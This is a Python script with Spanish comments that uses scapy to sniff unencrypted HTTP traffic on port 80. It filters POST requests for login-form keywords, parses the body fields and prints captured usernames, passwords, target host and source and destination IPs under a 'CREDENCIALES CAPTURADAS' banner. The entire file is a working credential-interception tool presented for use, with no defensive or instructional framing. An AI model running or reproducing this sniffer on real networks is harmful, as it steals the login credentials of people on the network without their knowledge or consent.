from scapy.all import sniff, IP, TCP, Raw, IFACES
from urllib.parse import unquote_plus
import re
import socket

# Palabras clave comunes en formularios de login
KEYWORDS = ["username", "user", "email", "login",
            "password", "passwd", "pass", "pwd", "token"]

CAMPOS_USUARIO = ["user", "username", "user_login", "email", "login", "uname", "usr"]
CAMPOS_PASS    = ["password", "pass", "passwd", "pwd", "user_password", "passw"]


def procesar_paquete(paquete):
    if not (paquete.haslayer(TCP) and paquete.haslayer(Raw)):
        return

    tcp = paquete[TCP]
    if tcp.dport != 80 and tcp.sport != 80:
        return

    try:
        payload = paquete[Raw].load.decode("utf-8", errors="ignore")
    except Exception:
        return

    if "POST" not in payload:
        return

    payload_lower = payload.lower()
    if not any(kw in payload_lower for kw in KEYWORDS):
        return

    src_ip = paquete[IP].src if paquete.haslayer(IP) else "?"
    dst_ip = paquete[IP].dst if paquete.haslayer(IP) else "?"

    # Extraer host del header HTTP
    host = "desconocido"
    host_match = re.search(r"Host:\s*(.+?)\r\n", payload)
    if host_match:
        host = host_match.group(1).strip()

    # Extraer body del POST
    body = ""
    if "\r\n\r\n" in payload:
        body = payload.split("\r\n\r\n", 1)[1]
    elif "\n\n" in payload:
        body = payload.split("\n\n", 1)[1]

    # Parsear campos clave=valor del body
    campos = {}
    for par in body.split("&"):
        if "=" in par:
            clave, _, valor = par.partition("=")
            campos[unquote_plus(clave).lower()] = unquote_plus(valor)

    # Identificar usuario y password
    usuario  = next((campos[c] for c in CAMPOS_USUARIO if c in campos), None)
    password = next((campos[c] for c in CAMPOS_PASS    if c in campos), None)

    sep = "=" * 60
    print(f"\n{sep}")
    print(f"  [!] CREDENCIALES CAPTURADAS")
    print(f"{sep}")
    print(f"  Sitio     : {host}")
    print(f"  Origen    : {src_ip}  ->  {dst_ip}")
    if usuario:
        print(f"  Usuario   : {usuario}")
    if password:
        print(f"  Password  : {password}")
    if not usuario and not password:
        print(f"  Datos     : {body[:300]}")
    print(f"{sep}")


def detectar_interfaz():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        mi_ip = s.getsockname()[0]
        s.close()
    except Exception:
        print("[!] No se pudo determinar la IP local.")
        return None, None

    for k, v in IFACES.items():
        try:
            if hasattr(v, 'ip') and v.ip == mi_ip:
                nombre = getattr(v, 'name', k)
                return k, nombre
        except Exception:
            continue
    return None, None


def main():
    INTERFAZ, nombre = detectar_interfaz()
    if not INTERFAZ:
        print("[!] No se encontro una interfaz activa.")
        return

    print(f"\n[*] Escuchando en {nombre} — puerto 80 (HTTP)")
    print("[*] Esperando peticiones POST con credenciales...\n")

    sniff(
        iface=INTERFAZ,
        filter="tcp port 80",
        prn=procesar_paquete,
        store=False
    )


if __name__ == "__main__":
    main()